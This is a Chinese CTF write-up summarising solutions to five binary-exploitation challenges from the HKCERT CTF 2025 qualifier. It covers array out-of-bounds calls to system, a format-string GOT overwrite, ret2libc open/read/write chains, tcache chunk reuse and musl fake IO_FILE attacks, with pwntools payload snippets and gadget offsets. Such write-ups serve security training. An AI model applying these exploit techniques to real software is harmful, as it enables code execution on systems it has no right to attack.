---
title: 香港網安奪旗賽HKCERT CTF 2025 資格賽PWN方向Writeup
contest: HKCERT CTF 2025 資格賽
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags: [fmtstr, pwntools, GOT-overwrite, fmtstr_payload, ret2libc, ORW, FSOP, fake-io, libc-internal, musl-pwn]
attack_chain:
- 第一题:Question Number 负数+Result数组下标system/bin_sh/prdi直接拼地址进数组
- 第二题:fmtstr_payload(6, {printf_got: backdoor})覆盖printf GOT触发后门
- 第三题:栈溢出0x70字节+0x10字节溢出覆盖返回地址+ret2libc ORW
- 第四题:login用户删除后第二次add复用chunk+tcache泄露+edit越界
- 第五题:musl libc pwn-IO fake IO_FILE构造+open/read/write三件套
key_payload: fmtstr_payload(6, {printf_got: backdoor})
one_liner: HKCERT 2025资格赛PWN方向5题集合,涵盖fmtstr基础题+PIE leak+GOT覆盖+ret2libc+ORW+musl FSOP fake IO_FILE。
lesson: fmtstr_payload偏移要从栈上找;musl的IO攻击面比glibc小很多,要自己分析__stdout_FILE结构体并构造fake io file。
quality: high
---

## 题目列表

5道PWN题,涵盖:
1. 基础fmtstr/数组下标
2. PIE leak + GOT overwrite
3. 栈溢出 + ret2libc ORW
4. login+add+edit越界+tcache bin
5. musl libc FSOP

## 关键考点

### 题1: 数组下标system/bin_sh
- main读入Question Number + Result到数组
- Q=-1, R=system;Q=-2, R=bin_sh;Q=-3, R=prdi
- 数组保存`system/bin_sh/prdi`地址,触发数组越界调用

### 题2: fmtstr_payload覆盖printf GOT
- %41$p泄露PIE base (返回地址在0x1296)
- PIE base = leak - 0x1296
- printf_got = pie_base + 0x4028
- backdoor = pie_base + 0x129D
- `fmtstr_payload(6, {printf_got: backdoor})` 偏移6
- 下一次printf("> ")直接跳backdoor

### 题3: 栈溢出ret2libc ORW
- 0x70字节buf + 8字节canary + 8字节saved_rbp + 8字节ret
- 跳过canary,溢出0x10字节:`payload = b"A"*0x70 + p64(0x004040A0 + 0xa00) + p64(0x0401130) + p64(0x04012B0) + p64(0x004010F0)`
- libc leak: `libc.address = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2045c0`
- pop_rdx_rbx_r12_rbp_ret+pop_rdi+pop_rsi+open+read+write ORW三件套
- payload尾部拼`b"/flag"`字符串

### 题4: 二次add复用chunk
- login:Feng_ZZ / choice=3 删除Feng_ZZ后第二次add复用
- add(0x80)+edit越界写name
- 4次add(0x80)+fill
- offset = (0x404ff0 - 0x04051A0) // 8
- `sendafter("name", "A"*0x40)`覆盖next指针触发tcache dup

### 题5: musl FSOP fake io file
- musl libc-2.36+没有传统的vtable+_IO_str_jumps攻击面
- 攻击__fwritex逻辑:`if (l > f->wend - f->wpos) return f->write(f, s, l);`
- 偏移-0x32c0-0x20+0x200触发缓冲区耗尽
- magic_gadget=0x54b32 (mov rax, rdi; mov rdi, [rdi+8]; call [rax])
- magic_2=0x77841 (构造ROP过渡)
- magic_3=0x83557 (push rdi; jmp [rdi-0x32])
- magic_4=0x4628 (pop rsp; ret 栈迁移)
- fake_io_file = p64(magic_3) + p64(__stdout_FILE+0x100+0x40) + padding*7 + p64(magic_gadget)
- 完整open+read+write三件套ROP

## 实战价值
- fmtstr_payload偏移确认:pwntools的fmtstr_payload自动计算
- musl pwn和glibc pwn的差异:musl IO更接近Linux裸调用
- ret2libc ORW几乎是所有PWN题目的兜底解法
